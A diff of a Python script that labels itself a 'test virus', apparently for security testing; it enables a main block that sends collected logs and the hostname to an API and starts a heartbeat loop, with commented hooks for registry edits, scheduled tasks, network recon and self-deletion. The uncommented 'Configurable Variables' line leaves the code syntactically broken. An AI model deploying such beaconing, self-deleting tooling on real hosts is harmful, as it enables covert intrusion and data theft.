@@ -15,11 +15,11 @@ from datetime import datetime, timedelta
 
 
 
-# Configurable Variables
-# API_KEY = "PLACEHOLDER_API_KEY"  
-# USE_CASES = PLACEHOLDER_USE_CASES
+Configurable Variables
+API_KEY = "PLACEHOLDER_API_KEY"  
+USE_CASES = PLACEHOLDER_USE_CASES
 
-# heartbeatRate = PLACEHOLDER_HEARTBEAT_RATE  # in seconds
+heartbeatRate = PLACEHOLDER_HEARTBEAT_RATE  # in seconds
 
 # Helper Functions
 def logging_func(log_data):
@@ -328,28 +328,28 @@ def heart_beat():
 #scheduled_tasks()
 #registry_edits()
 #net_recon()
-delete_self2()
+# delete_self2()
 
-# Main Execution
-# if __name__ == "__main__":
-#     try:
-#         logging_func("Starting test virus execution.")
+#Main Execution
+if __name__ == "__main__":
+    try:
+        logging_func("Starting test virus execution.")
         
-#         # Step 1: Execute use cases and collect aggregated logs
-#         logs = use_case_checker()
-#         payload = {
-#             "data": logs,
-#             "host_name": socket.gethostname()
-#         }
-#         print(socket.gethostname())
-#         logging_func(f"log_info: {logs}, host_name: {socket.gethostname()}")
+        # Step 1: Execute use cases and collect aggregated logs
+        logs = use_case_checker()
+        payload = {
+            "data": logs,
+            "host_name": socket.gethostname()
+        }
+        print(socket.gethostname())
+        logging_func(f"log_info: {logs}, host_name: {socket.gethostname()}")
 
-#         # Step 2: Send aggregated logs to the API
-#         data_to_send(payload)
+        # Step 2: Send aggregated logs to the API
+        data_to_send(payload)
 
 
-#         # Step 3: Enter heartbeat monitoring
-#         heart_beat()
+        # Step 3: Enter heartbeat monitoring
+        heart_beat()
 
-#     except Exception as e:
-#         logging_func(f"Error in main execution: {e}")
+    except Exception as e:
+        logging_func(f"Error in main execution: {e}")
